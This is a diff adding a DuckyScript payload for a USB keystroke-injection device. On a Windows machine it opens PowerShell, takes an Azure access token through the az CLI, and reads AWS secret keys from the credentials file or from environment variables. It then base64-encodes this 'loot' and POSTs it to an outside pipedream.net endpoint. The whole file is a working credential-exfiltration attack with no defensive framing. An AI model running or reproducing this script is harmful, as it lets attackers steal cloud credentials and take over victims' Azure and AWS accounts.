@@ -1,0 +1,57 @@
+REM Title: Exfil Cloud Credentials
+REM Author: github.com/jasonotu
+REM Description: Exfils Azure access token and AWS keys using respective CLI
+REM Target: Windows
+REM Version: 1.0
+REM Category: Exfiltration
+DEFAULTDELAY 10
+
+DEFINE #ENDPOINT https://xxxxxxxxxxxxxxxx.m.pipedream.net
+
+DELAY 1000
+REM Open Run dialog
+GUI r
+DELAY 500
+REM Type "powershell" to open PowerShell
+STRING powershell
+ENTER
+DELAY 1000
+
+REM Get access token from authenticated Azure CLI
+STRING $userProfile = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
+ENTER
+STRING $token = az account get-access-token
+ENTER
+STRING ($az_encoded = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($token)))
+ENTER
+DELAY 3000
+
+REM Get AWS keys
+STRING $creds = $userProfile + "\.aws\credentials"
+ENTER
+STRING echo $creds
+ENTER
+STRING $keys = if (Test-Path -Path $creds -PathType Leaf) {Get-Content -Path $creds} else
+ENTER 
+STRING {echo "AWS_ACCESS_KEY_ID = ${env:AWS_ACCESS_KEY_ID} AWS_SECRET_ACCESS_KEY = ${env:AWS_SECRET_ACCESS_KEY}"}
+ENTER
+STRING $aws_encoded = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($keys))
+ENTER
+
+REM Got the loot, exfil
+STRING $endpoint = ''
+ENTER
+STRING $loot = '{""az"":""' + $az_encoded + '"",""aws"":""' + $aws_encoded + '""}'
+ENTER
+DELAY 500
+REM Send the HTTP request
+STRING $response = Invoke-RestMethod -Uri #ENDPOINT -Method Post -ContentType 'application/json' -Body $loot
+ENTER
+DELAY 1000
+REM Display the response
+STRING $response
+ENTER
+DELAY 1000
+REM Exit PowerShell
+STRING exit
+ENTER
